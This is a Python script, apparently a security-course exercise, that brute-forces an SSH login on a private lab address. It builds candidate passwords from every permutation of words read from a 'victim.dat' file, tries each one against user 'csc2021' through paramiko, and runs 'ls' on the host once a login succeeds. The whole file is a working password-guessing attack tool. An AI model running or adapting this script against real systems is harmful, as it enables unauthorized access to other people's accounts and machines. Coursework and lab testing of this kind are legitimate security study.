from ast import iter_child_nodes
import itertools
import paramiko
import time
# https://stackoverflow.com/questions/25609153/paramiko-error-reading-ssh-protocol-banner
# above bug I don't know how to solve
def crack_password():
    
    # try all combimation of entries
    entries = [line.rstrip() for line in open('victim.dat', 'r')]
    print(entries)
    import pdb
    # pdb.set_trace()
    for i in range(1,len(entries)+1,1):
        print(i)
        combinations = itertools.combinations(entries, i)
        combinations = list(combinations)

        # iterate all 
        for j in range(len(combinations)):
            for l in itertools.permutations(combinations[j], i):
                permute = list(l)
                try_password = ""
                for k in range(i):
                    try_password = try_password + permute[k]
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    # can Adjust parameter auth_timeout to achieve it
                    client.connect('192.168.99.213', username='csc2021', password=try_password, banner_timeout=500)
                except paramiko.ssh_exception.AuthenticationException:
                    print("bad password ", try_password, "length ", len(try_password))
                    client.close()
                    continue
                print("pass ",try_password)
                return client
    
    print("crack password fail")
    exit()
            

if __name__ == '__main__':
    client = crack_password()
    stdin, stdout, stderr = client.exec_command('ls')
    for line in stdout:
        print('... ' + line.strip('\n'))
    client.close()
    pass